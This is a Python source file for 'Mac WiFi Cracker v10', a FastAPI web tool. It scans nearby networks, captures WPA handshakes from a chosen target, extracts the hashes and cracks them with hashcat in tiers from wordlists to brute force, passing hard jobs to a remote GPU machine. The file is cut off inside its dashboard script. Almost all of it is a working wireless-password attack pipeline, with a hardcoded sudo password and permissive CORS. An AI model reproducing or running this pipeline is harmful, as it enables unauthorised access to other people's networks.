#!/usr/bin/env python3
"""
Mac WiFi Cracker v10 (port 8765)
=================================
Key upgrades from v9:
- Socket.IO real-time progress (no polling)
- Auto-detect WiFi interface (RT5572 USB → en0 fallback)
- hcxdumptool capture (monitor mode, no WiFi toggle needed)
- Tier state machine: each tier has independent progress + completion
- hashcat --status parse: real speed, ETA, % progress
- Windows 4090 result callback via Socket.IO

Tiered cracking:
  Tier 1 (easy):   rockyou.txt (490 entries)
  Tier 2 (medium): wifi_wordlist_combined.txt (175K entries)
  Tier 3 (hard):   best66 + ?d×8 (11M+ entries)
  Tier 4 (brute):  ?d×9 (1B entries)
"""
import os, sys, json, subprocess, threading, time, re, shlex, signal
from pathlib import Path
from fastapi import FastAPI, Request, UploadFile, File
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# Socket.IO (asgi mode for FastAPI)
import socketio
import engineio

app = FastAPI(title="Mac WiFi Cracker v10")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# Socket.IO server
sio = socketio.AsyncServer(async_mode="asgi", cors_allowed_origins="*", logger=False, engineio_logger=False)
sio_app = socketio.ASGIApp(sio, other_asgi_app=app)

# ─── Config ───────────────────────────────────────────────────────────────────
WINDOWS_URL = "http://192.168.1.107:8766"
WINDOWS_PORT = 8766
HASHCAT = "/opt/homebrew/bin/hashcat"
HCXPCAPNGTOOL = "/opt/homebrew/bin/hcxpcapngtool"
HCXDUMPTOOL = "/opt/homebrew/bin/hcxdumptool"
TCPDUMP = "/usr/sbin/tcpdump"
SUDO_PASS = "240628"
LOG_FILE = f"/tmp/wifi_cracker_v10_{time.strftime('%Y%m%d')}.log"
LOG_LOCK = threading.Lock()
HASHCAT_STATUS_INTERVAL = 2  # seconds

# ─── Wordlist tiers ──────────────────────────────────────────────────────────
WORDLIST_TIERS = [
    {"name": "rockyou", "file": os.path.expanduser("~/wifi_cracker/wordlists/rockyou.txt"),
     "label": "Easy (490)", "hashcat_mode": "0", "max_time": 120},
    {"name": "wifi_combined", "file": os.path.expanduser("~/wifi_cracker/wordlists/wifi_wordlist_combined.txt"),
     "label": "Medium (175K)", "hashcat_mode": "0", "max_time": 300},
    {"name": "best66", "file": os.path.expanduser("~/wifi_cracker/wordlists/best66.txt"),
     "label": "Hard (11M)", "hashcat_mode": "3", "max_time": 600, "mask": "?d?d?d?d?d?d?d?d"},
    {"name": "brute_d9", "file": None,
     "label": "Brute ?d×9 (1B)", "hashcat_mode": "3", "max_time": 3600, "mask": "?d?d?d?d?d?d?d?d?d"},
]

# ─── State ────────────────────────────────────────────────────────────────────
STATE = {
    "status": "idle",           # idle | scanning | capturing | extracting | cracking_local | uploading | win_cracking | done
    "message": "Ready",
    "progress": 0,
    "interface": None,          # detected WiFi interface
    "interface_type": None,     # "usb_monitor" | "builtin" | None
    "ap_list": [],
    "capturing": False,
    "capture_file": None,
    "capture_ssid": None,
    "capture_bssid": None,
    "capture_eapol_count": 0,
    "hash_str": None,
    # Tier state machine
    "tiers": [
        {"idx": i, "name": t["name"], "label": t["label"], "status": "pending",
         "progress": 0, "speed": None, "eta": None, "words_tried": None, "completed": False}
        for i, t in enumerate(WORDLIST_TIERS)
    ],
    "crack_tier": -1,
    "cracking": False,
    "crack_result": None,
    "crack_source": None,
    # Windows 4090
    "win_status": None,
    "win_results": [],
    "win_progress": 0,
    "win_gpu_temp": None,
    "win_gpu_util": None,
    "win_speed": None,
    "log": [],
}

def log(msg):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{ts}] {msg}"
    STATE["log"].append(entry)
    if len(STATE["log"]) > 800:
        STATE["log"] = STATE["log"][-800:]
    print(entry, flush=True)
    with LOG_LOCK:
        try:
            with open(LOG_FILE, 'a') as f:
                f.write(entry + '\n')
        except:
            pass

def push_state():
    """Push full state to all connected Socket.IO clients."""
    try:
        import asyncio
        loop = asyncio.new_event_loop()
        loop.run_until_complete(sio.emit("state_update", STATE))
        loop.close()
    except Exception:
        pass

def run_sudo(cmd, timeout=10):
    p = subprocess.run(cmd, input=SUDO_PASS + "\n", capture_output=True, text=True, timeout=timeout)
    return p

# ─── Interface Detection ─────────────────────────────────────────────────────
def detect_wifi_interface():
    """
    Auto-detect best WiFi interface:
    1. USB WiFi adapter (RT5572 etc.) → monitor mode capable
    2. Built-in en0 → requires WiFi toggle for EAPOL
    Returns: (interface_name, type) where type is "usb_monitor" or "builtin"
    """
    log("Detecting WiFi interface...")
    # Method 1: Check for USB WiFi interfaces (en5, en6, etc.)
    # USB WiFi adapters typically create en5+ on macOS
    try:
        r = subprocess.run(["networksetup", "-listallhardwareports"], capture_output=True, text=True, timeout=10)
        ports = r.stdout
        usb_wifi = None
        # Look for "Wi-Fi" or "AirPort" ports that are NOT en0 (built-in)
        current_port_name = None
        current_iface = None
        for line in ports.splitlines():
            if "Hardware Port:" in line:
                current_port_name = line.split("Hardware Port:")[1].strip()
            elif "Device Name:" in line:
                current_iface = line.split("Device Name:")[1].strip()
                # USB WiFi adapters show as "Wi-Fi" or have "USB" in the name
                # and are NOT en0 (which is built-in)
                if current_iface and current_iface != "en0" and current_iface.startswith("en"):
                    if any(kw in current_port_name.lower() for kw in ["wi-fi", "wireless", "usb", "wlan", "802.11"]):
                        usb_wifi = current_iface
                # Also check if it's a known USB adapter pattern
                elif current_iface in ["en5", "en6", "en7", "en8"]:
                    # These are typically USB or external
                    if any(kw in current_port_name.lower() for kw in ["wi-fi", "wireless", "usb", "wlan", "802.11", "ralink", "realtek", "rt5572"]):
                        usb_wifi = current_iface
        
        if usb_wifi:
            log(f"✓ USB WiFi interface found: {usb_wifi} ({current_port_name})")
            STATE["interface"] = usb_wifi
            STATE["interface_type"] = "usb_monitor"
            return usb_wifi, "usb_monitor"
    except Exception as e:
        log(f"Interface detection error: {e}")
    
    # Method 2: Check if mon0 (monitor mode) exists
    try:
        r = subprocess.run(["ifconfig", "mon0"], capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            log("✓ Monitor mode interface found: mon0")
            STATE["interface"] = "mon0"
            STATE["interface_type"] = "usb_monitor"
            return "mon0", "usb_monitor"
    except:
        pass
    
    # Method 3: Fallback to built-in en0
    log("Using built-in WiFi interface: en0")
    STATE["interface"] = "en0"
    STATE["interface_type"] = "builtin"
    return "en0", "builtin"

# ─── WiFi Scan ───────────────────────────────────────────────────────────────
def scan_wifi(duration=10):
    STATE["status"] = "scanning"
    STATE["message"] = f"Scanning ({duration}s)..."
    STATE["progress"] = 10
    log(f"WiFi scan started ({duration}s)")
    
    # Get current network
    mac_current_ssid = None
    mac_current_bssid = None
    try:
        r = subprocess.run(["networksetup", "-getairportnetwork", "en0"],
                         capture_output=True, text=True, timeout=10)
        if r.returncode == 0 and r.stdout.strip():
            mac_current_ssid = r.stdout.strip().replace("Current Wi-Fi Network: ", "")
            log(f"Mac connected to: {mac_current_ssid}")
    except Exception as e:
        log(f"Get current network error: {e}")
    
    try:
        r = subprocess.run(["system_profiler", "SPAirPortDataType"],
                         capture_output=True, text=True, timeout=30)
        ap_map = {}
        cur_name = None
        in_section = False
        
        for line in r.stdout.splitlines():
            if "Current Network Information:" in line or "Other Local Wi-Fi Networks:" in line:
                in_section, cur_name = True, None
                continue
            if not in_section:
                continue
            indent = len(line) - len(line.lstrip(' '))
            if indent == 12 and line.rstrip().endswith(':'):
                cur_name = line.strip().rstrip(':')
                if cur_name and cur_name not in ap_map:
                    ap_map[cur_name] = {"ssid": cur_name, "bssid": "unknown", "channel": "",
                                       "connected": (cur_name == mac_current_ssid)}
            elif indent == 14 and cur_name and cur_name in ap_map:
                stripped = line.strip()
                if stripped.startswith("Channel:"):
                    ap_map[cur_name]["channel"] = stripped.split("Channel:")[1].split()[0]
                elif stripped.startswith("BSSID:"):
                    ap_map[cur_name]["bssid"] = stripped.split("BSSID:")[1].strip()
        
        ap_list = list(ap_map.values())
        ap_list.sort(key=lambda x: x["ssid"])
        STATE["ap_list"] = ap_list
        STATE["status"] = "idle"
        STATE["message"] = f"Found {len(ap_list)} networks"
        STATE["progress"] = 100
        log(f"Scan done: {len(ap_list)} APs")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Scan error: {e}"
        log(f"Scan error: {e}")
    push_state()

# ─── Capture ─────────────────────────────────────────────────────────────────
def start_capture(bssid, ssid, duration=60):
    iface = STATE["interface"] or "en0"
    iface_type = STATE["interface_type"] or "builtin"
    
    STATE["status"] = "capturing"
    STATE["capturing"] = True
    STATE["capture_file"] = f"/tmp/cap_{bssid.replace(':','')}_{int(time.time())}.pcapng"
    STATE["capture_ssid"] = ssid
    STATE["capture_bssid"] = bssid
    STATE["message"] = f"Capturing {ssid} on {iface} ({iface_type})..."
    STATE["progress"] = 20
    log(f"Capture: {ssid} on {iface} ({iface_type}), {duration}s")
    push_state()
    
    try:
        if iface_type == "usb_monitor":
            # USB WiFi in monitor mode: use hcxdumptool
            STATE["message"] = f"Monitor mode capture on {iface}..."
            cmd = [HCXDUMPTOOL, "-i", iface, "-o", STATE["capture_file"],
                   "--filteradd", bssid, "--timeout", str(duration * 1000)]
            if iface != "mon0":
                cmd.append("--enable11n")
            log(f"Running: {' '.join(cmd)}")
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=duration + 30)
            log(f"hcxdumptool exit: {p.returncode}")
            if p.stderr:
                for line in p.stderr.strip().splitlines()[-5:]:
                    log(f"[hcx] {line}")
        else:
            # Built-in WiFi: tcpdump + WiFi toggle
            STATE["message"] = f"Built-in WiFi capture on {iface} (toggling WiFi)..."
            pcap_file = STATE["capture_file"].replace(".pcapng", ".pcap")
            STATE["capture_file"] = pcap_file
            log(f"Running: tcpdump -i {iface}")
            
            # Toggle WiFi off then on to force reconnection (triggers EAPOL)
            run_sudo(f"networksetup -setairportpower {iface} off", timeout=5)
            time.sleep(2)
            # Start tcpdump
            p = subprocess.Popen(
                [TCPDUMP, "-i", iface, "-w", pcap_file, "-s", "0"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(1)
            # Toggle WiFi back on
            run_sudo(f"networksetup -setairportpower {iface} on", timeout=5)
            
            # Wait for capture duration
            wait_start = time.time()
            while time.time() - wait_start < duration:
                time.sleep(2)
                STATE["message"] = f"Capturing... {int(time.time()-wait_start)}s/{duration}s"
                push_state()
            p.terminate()
            try:
                p.wait(timeout=10)
            except:
                p.kill()
            log(f"tcpdump done, file: {pcap_file}")
        
        # Count EAPOL frames
        eapol_count = 0
        if os.path.exists(STATE["capture_file"]):
            if STATE["capture_file"].endswith(".pcapng"):
                r = subprocess.run([HCXPCAPNGTOOL, "-m", "4", STATE["capture_file"]],
                                  capture_output=True, text=True, timeout=10)
            else:
                r = subprocess.run([TCPDUMP, "-r", STATE["capture_file"], "-q"],
                                  capture_output=True, text=True, timeout=10)
            eapol_count = r.stdout.upper().count("EAPOL") if r.stdout else 0
        STATE["capture_eapol_count"] = eapol_count
        STATE["status"] = "idle"
        STATE["capturing"] = False
        STATE["message"] = f"Capture done: {eapol_count} EAPOL frames"
        STATE["progress"] = 40
        log(f"Capture complete: {eapol_count} EAPOL frames")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["capturing"] = False
        STATE["message"] = f"Capture error: {e}"
        log(f"Capture error: {e}")
    push_state()

# ─── Hash Extraction ─────────────────────────────────────────────────────────
def extract_hash(pcap_file, bssid, ssid):
    STATE["status"] = "extracting"
    STATE["message"] = "Extracting hash from capture..."
    STATE["progress"] = 45
    log(f"Extracting hash from {pcap_file}")
    push_state()
    
    try:
        # Method 1: hcxpcapngtool (best)
        hash_file = "/tmp/hash_extract.txt"
        if os.path.exists(hash_file):
            os.remove(hash_file)
        
        r = subprocess.run(
            [HCXPCAPNGTOOL, "-o", hash_file, "-z", hash_file, pcap_file],
            capture_output=True, text=True, timeout=30)
        
        if os.path.exists(hash_file):
            with open(hash_file, 'r') as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            if lines:
                log(f"✓ hcxpcapngtool: extracted {len(lines)} hash(es)")
                STATE["hash_str"] = lines[0]
                STATE["status"] = "idle"
                STATE["message"] = "Hash extracted ✓"
                STATE["progress"] = 50
                push_state()
                return lines[0]
        
        # Method 2: For .pcap files, try hcxpcapngtool directly
        r = subprocess.run(
            [HCXPCAPNGTOOL, "-z", "/tmp/hash_direct.txt", pcap_file],
            capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            hf = "/tmp/hash_direct.txt"
            if os.path.exists(hf):
                with open(hf, 'r') as f:
                    lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                if lines:
                    log(f"✓ Direct extraction: {len(lines)} hash(es)")
                    STATE["hash_str"] = lines[0]
                    STATE["status"] = "idle"
                    STATE["message"] = "Hash extracted ✓"
                    STATE["progress"] = 50
                    push_state()
                    return lines[0]
    except Exception as e:
        log(f"Extract error: {e}")
    
    STATE["status"] = "idle"
    STATE["message"] = "No hash found (0 EAPOL?)"
    push_state()
    return None

# ─── Tier State Machine + Local Crack ────────────────────────────────────────
def parse_hashcat_status(output):
    """Parse hashcat --status output for progress info."""
    info = {"speed": None, "progress_pct": 0, "eta": None, "words_tried": None}
    # Speed: "Speed.#1:        1234 H/s (MS: 1000)"
    m = re.search(r'Speed\.#1:\s+([\d,]+)\s+H/s', output)
    if m:
        info["speed"] = f"{m.group(1)} H/s"
    # Progress: "Progress: 12.34% (1234/10000)"
    m = re.search(r'Progress:\s+([\d.]+)%\s+\((\d+)/(\d+)\)', output)
    if m:
        info["progress_pct"] = float(m.group(1))
        info["words_tried"] = int(m.group(2))
    # ETA: "Time.Elapsed: HH:MM:SS"
    m = re.search(r'Time\.Elapsed:\s+(\d+):(\d+):(\d+)', output)
    if m:
        info["eta"] = f"{m.group(1)}:{m.group(2)}:{m.group(3)}"
    return info

def crack_tier(tier_idx):
    """Run one tier of the cracking pipeline with real-time progress."""
    tier = WORDLIST_TIERS[tier_idx]
    STATE["crack_tier"] = tier_idx
    STATE["cracking"] = True
    STATE["status"] = "cracking_local"
    STATE["tiers"][tier_idx]["status"] = "running"
    STATE["tiers"][tier_idx]["progress"] = 0
    STATE["message"] = f"Cracking: Tier {tier_idx+1} {tier['label']}..."
    STATE["progress"] = 50 + (tier_idx * 10)
    log(f"=== TIER {tier_idx+1}: {tier['label']} ===")
    push_state()
    
    hash_str = STATE.get("hash_str")
    if not hash_str:
        # Try to extract
        pcap = STATE.get("capture_file")
        bssid = STATE.get("capture_bssid")
        ssid = STATE.get("capture_ssid")
        if pcap and bssid and ssid:
            hash_str = extract_hash(pcap, bssid, ssid)
    if not hash_str:
        STATE["tiers"][tier_idx]["status"] = "error"
        STATE["message"] = "No hash available"
        log(f"Tier {tier_idx}: no hash")
        STATE["cracking"] = False
        push_state()
        return False
    
    result_file = f"/tmp/hashcat_result_t{tier_idx}.txt"
    if os.path.exists(result_file):
        os.remove(result_file)
    
    # Build hashcat command
    wordlist = tier.get("file")
    mask = tier.get("mask")
    
    if wordlist and os.path.exists(wordlist):
        cmd = [HASHCAT, "-m", "22000", "-a", tier.get("hashcat_mode", "0"),
               "-w", "3",  # high workload (4090-like performance on M-series)
               "-o", result_file,
               "--runtime", str(tier.get("max_time", 300)),
               "--status", "--status-timer", str(HASHCAT_STATUS_INTERVAL),
               hash_str, wordlist]
    elif mask:
        cmd = [HASHCAT, "-m", "22000", "-a", "3",  # hybrid: mask
               "-w", "3",
               "-o", result_file,
               "--runtime", str(tier.get("max_time", 600)),
               "--status", "--status-timer", str(HASHCAT_STATUS_INTERVAL),
               hash_str, mask]
    else:
        log(f"Tier {tier_idx}: no wordlist file found: {wordlist}")
        STATE["tiers"][tier_idx]["status"] = "error"
        STATE["cracking"] = False
        STATE["message"] = f"Wordlist not found: {tier['label']}"
        push_state()
        return False
    
    log(f"Running: {' '.join(cmd[:10])}...")
    
    # Run hashcat with real-time status parsing
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        # Read output line by line, parse status updates
        start_time = time.time()
        max_wait = tier.get("max_time", 300) + 60
        last_push = 0
        
        for line in p.stdout:
            line = line.strip()
            if not line:
                continue
            # Check for result
            if "hashcat" in line.lower() and ("digest" in line.lower() or "cracked" in line.lower()):
                pass  # Will check result file after
            # Parse status lines
            if "Speed" in line or "Progress" in line or "Status" in line:
                status_info = parse_hashcat_status(line)
                if status_info["speed"]:
                    STATE["tiers"][tier_idx]["speed"] = status_info["speed"]
                    STATE["tiers"][tier_idx]["progress"] = status_info["progress_pct"]
                    STATE["tiers"][tier_idx]["words_tried"] = status_info["words_tried"]
                if status_info["eta"]:
                    STATE["tiers"][tier_idx]["eta"] = status_info["eta"]
                # Push state periodically (not every line)
                now = time.time()
                if now - last_push > HASHCAT_STATUS_INTERVAL:
                    STATE["message"] = f"Tier {tier_idx+1} ({tier['label']}): {status_info.get('speed','?')} {status_info.get('progress_pct',0):.1f}%"
                    push_state()
                    last_push = now
            # Check for exhaustion
            if "Exhausted" in line or "Hashes:.*Exhausted" in line:
                log(f"Tier {tier_idx}: EXHAUSTED (all words tried)")
                break
        
        p.wait(timeout=60)
        exit_code = p.returncode
        
        # hashcat exit codes: 0=found, 1=exhausted, 14=runtime exceeded
        log(f"Tier {tier_idx} hashcat exit: {exit_code}")
        
        # Check result
        if os.path.exists(result_file):
            with open(result_file, 'r') as f:
                results = [line.strip() for line in f if line.strip()]
            if results:
                STATE["tiers"][tier_idx]["status"] = "cracked"
                STATE["tiers"][tier_idx]["progress"] = 100
                STATE["crack_result"] = results[0]
                STATE["crack_source"] = f"Mac Tier {tier_idx+1} ({tier['label']})"
                STATE["status"] = "done"
                STATE["message"] = f"✓ CRACKED (Tier {tier_idx+1} {tier['label']}): {results[0]}"
                STATE["progress"] = 100
                log(f"✓ CRACKED: {results[0]}")
                STATE["cracking"] = False
                push_state()
                return True
        
        # No crack - mark tier as exhausted
        STATE["tiers"][tier_idx]["status"] = "exhausted"
        STATE["tiers"][tier_idx]["progress"] = 100
        STATE["tiers"][tier_idx]["completed"] = True
        STATE["message"] = f"Tier {tier_idx+1} ({tier['label']}) exhausted - no match"
        log(f"Tier {tier_idx} exhausted, no match")
        
    except subprocess.TimeoutExpired:
        p.kill()
        STATE["tiers"][tier_idx]["status"] = "timeout"
        STATE["tiers"][tier_idx]["completed"] = True
        STATE["message"] = f"Tier {tier_idx+1} timeout"
        log(f"Tier {tier_idx} timeout")
    except Exception as e:
        STATE["tiers"][tier_idx]["status"] = "error"
        STATE["message"] = f"Tier {tier_idx+1} error: {e}"
        log(f"Tier {tier_idx} error: {e}")
    
    STATE["cracking"] = False
    push_state()
    return False  # Not cracked, move to next tier

def auto_crack_pipeline():
    """Run the full tiered cracking pipeline: easy → hard → brute."""
    log("=== AUTO CRACK PIPELINE START ===")
    for tier_idx in range(len(WORDLIST_TIERS)):
        if STATE.get("crack_result"):
            break  # Already cracked
        # Check if this tier has been done before
        if STATE["tiers"][tier_idx]["completed"]:
            log(f"Tier {tier_idx+1} already completed, skipping")
            continue
        cracked = crack_tier(tier_idx)
        if cracked:
            break
        # If local tiers exhausted, try Windows 4090
        if tier_idx >= 1:  # After tier 2 (medium)
            log("Local tiers exhausted, sending to Windows 4090...")
            send_to_4090()
            break
    log("=== AUTO CRACK PIPELINE END ===")
    push_state()

# ─── Windows 4090 ────────────────────────────────────────────────────────────
def send_to_4090():
    """Send hash to Windows 4090 for heavy cracking."""
    STATE["status"] = "uploading"
    STATE["message"] = "Sending to Windows 4090..."
    STATE["progress"] = 70
    log(f"Send hash → {WINDOWS_URL}")
    push_state()
    
    try:
        import requests
        hash_str = STATE.get("hash_str")
        ssid = STATE.get("capture_ssid") or "unknown"
        bssid = STATE.get("capture_bssid")
        
        if not hash_str:
            STATE["status"] = "idle"
            STATE["message"] = "No hash to send"
            push_state()
            return
        
        r = requests.post(
            f"{WINDOWS_URL}/api/receive-hash",
            json={"hash": hash_str, "ssid": ssid, "bssid": bssid},
            timeout=30)
        
        if r.status_code == 200:
            STATE["status"] = "win_cracking"
            STATE["message"] = "✓ Windows 4090 cracking..."
            STATE["progress"] = 75
            log("Hash sent to Windows 4090 ✓")
        else:
            STATE["status"] = "idle"
            STATE["message"] = f"Send failed: HTTP {r.status_code}"
            log(f"Send failed: {r.status_code}")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Send error: {e}"
        log(f"Send error: {e}")
    push_state()

def poll_windows():
    """Poll Windows 4090 status (backup to Socket.IO)."""
    try:
        import requests
        r = requests.get(f"{WINDOWS_URL}/api/state", timeout=5)
        d = r.json()
        STATE["win_status"] = d.get("status")
        STATE["win_results"] = d.get("results", [])
        STATE["win_progress"] = d.get("progress", 0)
        STATE["win_gpu_temp"] = d.get("gpu_temp")
        STATE["win_gpu_util"] = d.get("gpu_util")
        STATE["win_speed"] = d.get("speed")
        
        if d.get("status") == "cracked" and d.get("results"):
            STATE["crack_result"] = d["results"][0]
            STATE["crack_source"] = "Windows 4090"
            STATE["status"] = "done"
            STATE["message"] = f"✓ Windows 4090 CRACKED: {d['results'][0]}"
            STATE["progress"] = 100
            log(f"✓ Windows 4090 cracked: {d['results'][0]}")
            push_state()
    except:
        STATE["win_status"] = "unreachable"

# ─── Socket.IO Events ────────────────────────────────────────────────────────
@sio.event
async def connect(sid, environ):
    log(f"Socket.IO client connected: {sid}")
    # Send current state immediately
    await sio.emit("state_update", STATE, to=sid)

@sio.event
async def disconnect(sid):
    log(f"Socket.IO client disconnected: {sid}")

@sio.event
async def on_subscribe(sid, data):
    """Client subscribes to state updates."""
    log(f"Client {sid} subscribed")

# ─── API Endpoints ───────────────────────────────────────────────────────────
@app.get("/")
async def root():
    return HTMLResponse(DASHBOARD_HTML)

@app.get("/api/state")
async def api_state():
    return JSONResponse(STATE)

@app.post("/api/scan")
async def api_scan(duration: int = 10):
    threading.Thread(target=scan_wifi, args=[duration], daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/capture")
async def api_capture(bssid: str, ssid: str, duration: int = 60):
    threading.Thread(target=start_capture, args=[bssid, ssid, duration], daemon=True).start()
    return JSONResponse({"ok": True, "interface": STATE["interface"], "type": STATE["interface_type"]})

@app.post("/api/extract")
async def api_extract():
    def _extract():
        pcap = STATE.get("capture_file")
        bssid = STATE.get("capture_bssid")
        ssid = STATE.get("capture_ssid")
        if pcap and bssid and ssid:
            extract_hash(pcap, bssid, ssid)
    threading.Thread(target=_extract, daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/crack_tier")
async def api_crack_tier(tier: int = 0):
    threading.Thread(target=crack_tier, args=[tier], daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/auto_crack")
async def api_auto_crack():
    threading.Thread(target=auto_crack_pipeline, daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/upload")
async def api_upload():
    threading.Thread(target=send_to_4090, daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/result")
async def api_result(request: Request):
    data = await request.json()
    password = data.get("password")
    source = data.get("source", "Windows 4090")
    if password:
        STATE["crack_result"] = password
        STATE["crack_source"] = source
        STATE["status"] = "done"
        STATE["message"] = f"✓ Cracked by {source}: {password}"
        STATE["progress"] = 100
        log(f"✓ Cracked by {source}: {password}")
        push_state()
        return JSONResponse({"ok": True})
    return JSONResponse({"ok": False, "error": "No password"})

@app.get("/api/interface")
async def api_interface():
    return JSONResponse({"interface": STATE["interface"], "type": STATE["interface_type"]})

@app.post("/api/rediscover")
async def api_rediscover():
    threading.Thread(target=detect_wifi_interface, daemon=True).start()
    return JSONResponse({"ok": True})

# ─── Dashboard HTML ──────────────────────────────────────────────────────────
DASHBOARD_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Mac WiFi Cracker v10</title>
<style>
body{font-family:-apple-system,sans-serif;max-width:1000px;margin:0 auto;padding:20px;background:#1a1a2e;color:#eee}
h1{color:#4fc3f7;margin-bottom:0;font-size:22px}
.card{background:#16213e;border-radius:8px;padding:15px;margin:10px 0}
.status{color:#4fc3f7;font-weight:bold}
.progress{width:100%;height:22px;background:#0f3460;border-radius:11px;overflow:hidden;margin:8px 0}
.progress-bar{height:100%;background:linear-gradient(90deg,#4fc3f7,#29b6f6);transition:width 0.5s;border-radius:11px}
.log{background:#0f3460;padding:10px;border-radius:4px;font-family:monospace;font-size:11px;max-height:250px;overflow-y:auto;white-space:pre-wrap}
button{background:#4fc3f7;color:#1a1a2e;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-size:15px;margin:5px}
button:hover{background:#29b6f6}
button:disabled{background:#555;cursor:not-allowed}
button.danger{background:#ff5252}
button.small{font-size:13px;padding:6px 12px}
table{width:100%;border-collapse:collapse}
th,td{padding:7px;text-align:left;border-bottom:1px solid #0f3460;font-size:13px}
th{color:#4fc3f7}
select,input{background:#0f3460;color:#eee;border:none;padding:7px;border-radius:4px;margin:4px}
.tier-card{background:#0f3460;padding:10px;border-radius:6px;margin:5px 0;display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:8px;align-items:center}
.tier-card.done{opacity:0.6}
.tier-card.running{border:1px solid #4fc3f7}
.tier-name{font-weight:bold;font-size:14px}
.tier-status{font-size:12px;padding:2px 8px;border-radius:10px;text-align:center}
.tier-pending{background:#37474f;color:#aaa}
.tier-running{background:#1565c0;color:#fff}
.tier-exhausted{background:#4e342e;color:#ffab91}
.tier-cracked{background:#1b5e20;color:#a5d6a7}
.tier-error{background:#b71c1c;color:#fff}
.tier-prog{font-size:12px;color:#4fc3f7;text-align:center}
.tier-speed{font-size:11px;color:#aaa;text-align:center}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:bold}
.badge-connected{background:#4caf50;color:#000}
.selected-row{background:#0f3460 !important}
.eapol-badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:13px;font-weight:bold}
.eapol-ok{background:#4caf50;color:#000}
.eapol-none{background:#f44336;color:#fff}
.result-banner{background:linear-gradient(135deg,#1b5e20,#2e7d32);border:2px solid #4caf50;border-radius:8px;padding:15px;margin:10px 0;font-size:18px;text-align:center}
.result-banner .pw{font-size:28px;font-weight:bold;color:#fff;letter-spacing:2px}
.win-card{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
.win-item{background:#0f3460;padding:10px;border-radius:6px;text-align:center}
.win-value{font-size:20px;color:#4fc3f7;font-weight:bold}
.win-label{font-size:11px;color:#aaa;margin-top:4px}
.section-num{color:#4fc3f7;font-size:14px;font-weight:bold}
.iface-badge{background:#0f3460;padding:4px 10px;border-radius:4px;font-size:12px;color:#4fc3f7}
</style></head><body>
<h1>📡 Mac WiFi Cracker v10 <span class="iface-badge" id="iface-badge">--</span></h1>

<div class="card">
<div class="status">Status: <span id="status">Connecting...</span></div>
<div class="progress"><div class="progress-bar" id="progress" style="width:0%"></div></div>
<p id="message">Waiting for data...</p>
<div id="eapol-display"></div>
</div>

<div class="card" id="result-card" style="display:none">
<div class="result-banner">
<div>🎉 Password Cracked!</div>
<div class="pw" id="result-pw"></div>
<div style="margin-top:8px;font-size:14px;color:#c8e6c9">Source: <span id="result-source"></span></div>
</div>
</div>

<div class="card">
<h2><span class="section-num">1.</span> Scan</h2>
<input type="number" id="scan-dur" value="10" min="5" max="60" style="width:70px"> sec
<button onclick="scan()" id="btn-scan">🔍 Scan</button>
<table id="ap-table"><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th></th></tr></thead><tbody></tbody></table>
</div>

<div class="card">
<h2><span class="section-num">2.</span> Capture</h2>
Target: <b id="target-ssid" style="color:#4fc3f7">--</b> <span id="target-badge"></span>
<input type="number" id="cap-dur" value="60" min="10" max="300" style="width:70px"> sec
<button onclick="capture()" id="btn-capture">📸 Capture</button>
</div>

<div class="card">
<h2><span class="section-num">3.</span> Crack (Tiered)</h2>
<div id="tier-list"></div>
<button onclick="autoCrack()" id="btn-auto" style="background:#4caf50;margin-top:10px">⚡ Auto All Tiers</button>
<button onclick="sendWin()" id="btn-win" style="background:#9c27b0;margin-top:10px">🖥️ Send to 4090</button>
</div>

<div class="card">
<h2><span class="section-num">4.</span> Windows 4090</h2>
<div class="win-card">
<div class="win-item"><div class="win-value" id="win-status">--</div><div class="win-label">Status</div></div>
<div class="win-item"><div class="win-value" id="win-temp">--</div><div class="win-label">GPU Temp</div></div>
<div class="win-item"><div class="win-value" id="win-util">--</div><div class="win-label">GPU Util</div></div>
<div class="win-item"><div class="win-value" id="win-speed" style="font-size:13px">--</div><div class="win-label">Speed</div></div>
</div>
</div>

<div class="card">
<h2><span class="section-num">5.</span> Log</h2>
<div class="log" id="log"></div>
</div>

<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script>
let selectedSsid = null, selectedBssid = null;
let lastState = {};

async function api(path, opts) {
  try { const r = await fetch(path, opts); return r.json(); }
  catch(e) { return {}; }
}

function scan() {
  const dur = document.getElementById('scan-dur').value;
  document.getElementById('btn-scan').disabled = true;
  api(`/api/scan?duration=${dur}`, {method: 'POST'});
}

function selectAp(ssid, bssid, ev) {
  selectedSsid = ssid; selectedBssid = bssid;
  document.getElementById('target-ssid').textContent = ssid;
  document.querySelectorAll('#ap-table tbody tr').forEach(tr => tr.classList.remove('selected-row'));
  ev.target.closest('tr').classList.add('selected-row');
  const ap = (lastState.ap_list||[]).find(a => a.ssid === ssid);
  document.getElementById('target-badge').innerHTML = (ap && ap.connected) ? '<span class="badge badge-connected">CONNECTED</span>' : '';
}

function capture() {
  if (!selectedSsid) return alert('Select a network first');
  const dur = document.getElementById('cap-dur').value;
  document.getElementById('btn-capture').disabled = true;
